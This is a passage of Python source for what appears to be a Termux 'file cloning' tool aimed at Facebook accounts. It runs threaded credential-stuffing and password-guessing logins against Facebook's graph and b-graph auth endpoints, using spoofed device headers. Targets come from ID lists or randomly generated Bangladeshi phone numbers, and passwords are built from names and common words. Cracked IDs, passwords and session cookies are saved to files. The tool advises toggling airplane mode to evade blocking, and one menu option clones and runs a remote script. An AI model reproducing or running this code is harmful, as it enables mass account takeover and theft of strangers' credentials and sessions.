            xd=input(f'\033[92;1m[<+>]\033[1;37m Choice :\033[92;1m ')
            if xd in ['A','1']:method_crack()
            if xd in ['B','2']:os.system("git clone https://github.com/Hannan-404/FILE.git&&cd FILE&&python V33.py")
            if xd in ['C','3']:randm()
            if xd in ['D','4']:print('coming soon');exit()
            if xd in ['E','5']:print('coming soon');exit()
            if xd in ['F','6']:tutorial()
            if xd in ['G','7']:admin()
            if xd in ['H','8']:exit()
            
#─━──━─━FILE METHOD SYS─━──━─━─#                                                      
def method_crack():
    global methods
    clear()
    print(f'\033[92;1m[\033[1;37m1\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-FAST\033[1;30m-\033[1;37m] ')
    print(f'\033[92;1m[\033[1;37m2\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-BEST\033[1;30m-\033[1;37m] ')
  #  print(f'\033[92;1m[\033[1;37m3\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-FAST\033[1;30m-\033[1;37m] ')
    print(f'\033[92;1m[\033[1;37m0\033[92;1m] \033[1;37mB\033[92;1m-\033[1;37mAC\033[92;1m-\033[92;1mK ')
    linex()
    option = input('\033[92;1m[<+>]\033[1;37m Choice :\033[92;1m ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
    	methods.append('methodC')
    	main_crack().crack(id)
    elif option =='0':
        YousuF()
    else:
      print('\033[92;1m[<+>]\033[91;1m SELECT VALID OPTION ...')
      time.sleep(2)
      method_crack()
#─━─━─━─━FILE Setting─━─━─━─━─#
class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example:\033[1;37m /sdcard/YM.txt ')
        self.file = input('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m PUT\033[1;37m FILE\x1b[1;92m PATH :\033[92;1m ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('\x1b[1;92m[•]\033[1;37m ━\033[91;1m FILE lOCATION NOT FOUND ')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('\x1b[1;92m[•]\033[1;37m ━\033[91;1m TRY AGAIN')
            time.sleep(2)
            main_crack().crack(id)       
#─━─━─━─━FILE-M1─━─━─━─━─#
	#graph  
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\33[1;32m[SalaM]\033[1;37m-\33[1;32m[M\033[1;37m1\33[1;32m]\033[1;37m<> \33[1;32m[{loop}\033[1;37m/\33[1;32m{len(self.id)}]\033[1;37m <>\33[1;32mOK \033[1;37m:\033[1;32m {len(oks)} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                FBLC = random.choice(["es_ES","sl_SI","ms_MY","mk_MK","ne_NP","bn_IN","pl_PL","en_US","fr_FR","de_DE","es_ES"])
                kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','Hisense-L678','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
                uaa = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+'[FBAN/FB4A;FBAV/421.0.0.30.106;FBBV/57688213;FBDM/{density=2.25,width=1080,height=2340};FBLC/en_US;FBCR/Robi;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana]'
                uam = '[Mozilla/5.0 (Linux; Android 7.0; Colors P45 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36]'
                with requests.Session() as session:
                    device_id = str(uuid.uuid4())
                    adid = str(uuid.uuid4())
                    data = {"adid": adid,
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "register_api",
                    "email": sid,
                    "password": ps,
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "NO_FILE",
                    "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
                    "currently_logged_in_userid": "0",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d",}
                    headers={'User-Agent':Samsung(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': '25227',
                    'X-FB-SIM-HNI': '29752',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                    'Content-Length': '706'}
                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);YousuFb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={YousuFb};{ckkk}"
                    print(f"\r{R}[SalaM-OK] {sid} | {ps} {S}")                   
                    oks.append(sid)
                    open('/sdcard/SalaM/SalaM_OK_CookiE_ids_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-20-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
#─━─━─━─━FILE-M2─━─━─━─━─#
	#b-graph
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\33[1;32m[SalaM]\033[1;37m-\33[1;32m[M\033[1;37m2\33[1;32m]\033[1;37m <=> \33[1;32m[{loop}\033[1;37m/\33[1;32m{len(self.id)}]\033[1;37m <=> \33[1;32mOK \033[1;37m➣\033[1;32m {len(oks)}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': sex2(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);YousuFb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={YousuFb};{ckkk}"
                    print(f"\r{R}[SalaM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SalaM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YousuF_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-1-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)         
#─━─━─━─━FILE-M3─━─━─━─━─#
	#graph  
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\33[1;32m[YousuF]\033[1;37m-\33[1;32m[M\033[1;37m3\33[1;32m]\033[1;37m<> \33[1;32m[{loop}\033[1;37m/\33[1;32m{len(self.id)}]\033[1;37m <>\33[1;32mOK \033[1;37m:\033[1;32m {len(oks)} ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': m3XD(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);YousuFb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={YousuFb};{ckkk}"
                    print(f"  \r{R} [YousuF-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/YousuF_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YousuF_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r{A} [YousuF-CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/YousuF_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
#─━─━──━FILE-PSS-SYS─━─━─━─#           
    def pasw(self):       
            pw = []
            clear()
            print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m password Limit\033[1;37m ━ \x1b[1;92mMinimum\033[1;37m [2]\x1b[1;92m Maximum \033[91;1m[20] ')
            linex()
            sl = int(input('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m How many passwords do you want to add \033[91;1m?\033[92;1m '))
            clear()
            print(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m EXAMPLE : \033[92;1mfirst last\033[1;37m-\033[92;1m57273200\033[1;37m-\033[92;1m59039200\033[1;37m-\033[92;1mEtc')
            linex()
            if sl =='':
                print('\n\033[92;1m>> \033[1;37Put limit between 1 to 30')
            elif sl > 20:
                print('\n\033[91\;1mPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Put password {sr+1}:\033[92;1m '))
                    linex()
            clear()     
            print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m FILE CLONE  ')
            linex()
            print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL ID ─────────\033[38;5;46m➤ \033[1;37m %s ' % len(self.id))
            print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
            linex()
            with YousuFYousuF(max_workers=30) as YousuFworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                YousuFworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                YousuFworld.submit(self.methodB, uid, name, pwx)
                   except:pass
            result(oks,cps)
#─━─━─━─━Admin cntct─━─━─━─━─#
def admin():
			clear()
			print("\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37mADMIN CONTACT ")
			linex()
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(A)\033[92;1m━─ \033[1;37mCONTACT WHATSAPP ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(B)\033[92;1m━─ \033[1;37mCONTACT FACEBOOK ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(C)\033[92;1m━─ \033[1;37mCONTACT TELEGRAM ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(D)\033[92;1m━─ \033[1;37mCONTACT EMAIL ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(E)\033[92;1m━─ \033[1;37mB\033[92;1m-\033[1;37mAC\033[92;1m-\x1b[1;92mK')
			linex()
			YM=input(f'\033[92;1m[<+>]\033[1;37m SELECT OPTION   :\033[92;1m ')
			if YM in ['A','1']:os.system("xdg-open https://wa.me/+8801317481984")				
			if YM in ['B','2']:os.system("xdg-open https://www.facebook.com/CEO.Of.DreamBuilders.TEAM ")				
			if YM in ['C','3']:os.system("xdg-open https://t.me/rexyousuf")				
			if YM in ['D','4']:os.system("xdg-open https://mail.google.com/mail/mu/mp/487/#co")				
			if YM in ['E','5']:YousuF()
			else:
				time.sleep(3)
				admin()				
#─━─━─━─━Tutorial sys─━─━─━─━─#
def tutorial():
			clear()
			print("\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37mTUTORIAL ")
			linex()
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(A)\033[92;1m━─ \033[1;37mFollow Tools Owner Fb Profile ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(B)\033[92;1m━─ \033[1;37mFollow tutorial Update Fb pege')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(C)\033[92;1m━─ \033[1;37mHow to download Best V. Termux & setup ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(D)\033[92;1m━─ \033[1;37mHow to Run File cloning Tools ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(E)\033[92;1m━─ \033[1;37mHow to create File & Cookie Make ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(F)\033[92;1m━─ \033[1;37mHow to run any File cloning tools ')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(G)\033[92;1m━─ \033[1;37mHow to use cloning tools 1-4 Part Links')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(H)\033[92;1m━─ \033[1;37mB\033[92;1m-\033[1;37mAC\033[92;1m-\x1b[1;92mK')
			linex()
			YM=input(f'\033[92;1m[<+>]\033[1;37m SELECT OPTION   :\033[92;1m ')
			if YM in ['A','1']:os.system("xdg-open https://www.facebook.com/CEO.Of.DreamBuilders.TEAM ")				
			if YM in ['B','2']:os.system("xdg-open https://www.facebook.com/profile.php?id=61552108512007 ")				
			if YM in ['C','3']:os.system("xdg-open https://www.facebook.com/61552108512007/posts/pfbid02YptXiARak3SuW7xLhXoSRWYNkUENPgiAadBi3Nwttad3tqSFQftEEuZ6UY2TYhNdl/?app=fbl")				
			if YM in ['D','4']:os.system("xdg-open https://www.facebook.com/61552108512007/posts/pfbid0hTqUfnermRHNXtPCQ7o47DAQHLd5KbCtceXS7Eyic5zxWAHoNepX3SCrRbDn1wKpl/?app=fbl ")				
			if YM in ['E','5']:os.system("xdg-open https://www.facebook.com/61552108512007/posts/pfbid01UsNCLcRmc2P9nbCyQMAtjkVddLBBAwsVsHzXKjCELR3po6RvqS9Nsph2jyvZo3Gl/?app=fbl")				
			if YM in ['F','6']:os.system("xdg-open https://www.facebook.com/61552108512007/posts/pfbid0nirrqqdPhhgfNooEFbwqp1VvP6gyX5q1iP61LRPDNfyiZQAPUD2vh9A1b2kaJynbl/?app=fbl")				
			if YM in ['G','7']:os.system("xdg-open https://www.facebook.com/61552108512007/posts/pfbid0dMDJgCCQ7oNDMejqawbbQ3rhcnyn1Gs9fjwGhGmhUEfFydL51dWjpcxQssV1R67Ql/ ")				
			if YM in ['H','8']:YousuF()         
			else:
				time.sleep(3)
				tutorial()				
#─━─━─━─━random sys─━─━─━─━─#
def randm():
			clear()
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(A)\033[92;1m━─ \033[1;37mB\033[92;1m-\033[1;37mD CRACK')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(B)\033[92;1m━─ \033[1;37mIND CRACK')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(C)\033[92;1m━─ \033[1;37mPAK CRACK')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(D)\033[92;1m━─ \033[1;37mAFG CRACK')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(E)\033[92;1m━─ \033[1;37mNEP CRACK')
			print(f'\x1b[1;92m[•]\033[1;37m\x1b[1;92m\033[92;1m─━\033[1;37m(F)\033[92;1m━─ \033[1;37mB\033[92;1m-\033[1;37mAC\033[92;1m-\033[1;37mK')
			linex()
			YM=input(f'\033[92;1m[<+>]\033[1;37m SELECT COUNTRY :\033[92;1m ')
			if YM in ['A','1']:rndbd()
			if YM in ['B','2']:rndind()
			if YM in ['C','3']:rndpk()
			if YM in ['D','4']:rndafg()
			if YM in ['E','5']:rndnep()
			if YM in ['F','6']:YousuF()	
#─━─━─━─━Random sys bd─━─━─━─━─#
def rndbd():
    user=[]
    twf =[]
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m BD SIM CODE :\033[1;92m 017 - 018 - 019 - 016')
    linex()
    code = input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SELECT SIM CODE  : ')
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
    linex()
    limit = int(input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m ENTER YOUR LIMIT : '))
    clear()
    print(f'\33[1;37m\033[92;1m[\033[1;37mA\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-FAST\033[1;30m-\033[1;37m]')
    print(f'\33[1;37m\033[92;1m[\033[1;37mB\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-BEST\033[1;30m-\033[1;37m] ')
    print(f'\33[1;37m\033[92;1m[\033[1;37mC\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-SLOW\033[1;30m-\033[1;37m]')
    print(f'\33[1;37m\033[92;1m[\033[1;37mD\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-TEST\033[1;30m-\033[1;37m]  ')
    linex()
    mthdx=input(f'\033[92;1m[<+>]\033[1;37m SELECT METHOD :\033[92;1m ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        user.append(nmp)
    with YousuFYousuF(max_workers=30) as YousuF:
        clear()
        tl = str(len(user))
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m RANDOM CLONE\33[1;37m [BD] ')
        linex()      
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SIM CODE \33[1;33m ────────➤\33[1;37m {code} \033[1;37m")
        print(f"\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TOTAL ACCOUNTS\33[1;33m ───➤\33[1;37m {tl}")
        print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m TRUN ON\033[91;1m AIRPLANE\x1b[1;92m MODE AFTER \033[1;37m4\x1b[1;92m MIN ')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'alhamdulillah','mababa','abbuammu','aabbcc','maliha','hridoy','sadiya']
            ids = code+love
            if mthdx in ['A','1']:YousuF.submit(rndi1,ids,pwx,tl)            	
            if mthdx in ['B','2']:YousuF.submit(api2,ids,pwx,tl)          	
            if mthdx in ['C','3']:YousuF.submit(graph,ids,pwx,tl)            	
            if mthdx in ['D','4']:YousuF.submit(graph2,ids,pwx)                	
    print('\033[1;37m')
    linex()
    print(f'\33[1;37m\33[1;32m THE PROCESS HAS COMPLETED ')
    print(f'\33[1;37m\33[1;32m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    linex()
    input(f'\33[1;37m\033[47m\033[1;30mPRESS ENTER TO BACK \033[40m\033[00m\033[1;37m ')
    YousuF()
#─━─━──━Random sys ind─━─━──━─#
def rndind():
    user=[]
    twf =[]
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m IND SIM CODE :\033[1;92m +91789 - +91720 - +91730 ')
    linex()
    code = input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m SELECT SIM CODE  : ')
    clear()
    print('\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m Example: \033[1;37m3000 \033[92;1m-\033[1;37m 5000 \033[92;1m-\033[1;37m 10000 \033[92;1m-\033[1;37m 20000\033[1;37m')
    linex()
    limit = int(input(f'\x1b[1;92m[•]\033[1;37m ━\x1b[1;92m ENTER YOUR LIMIT : '))
    clear()
    print(f'\33[1;37m\033[92;1m[\033[1;37mA\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-FAST\033[1;30m-\033[1;37m]')
    print(f'\33[1;37m\033[92;1m[\033[1;37mB\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-BEST\033[1;30m-\033[1;37m] ')
    print(f'\33[1;37m\033[92;1m[\033[1;37mC\033[92;1m] \033[1;37mMETHO\033[92;1mD\033[1;37m [\033[1;30m-SLOW\033[1;30m-\033[1;37m]')
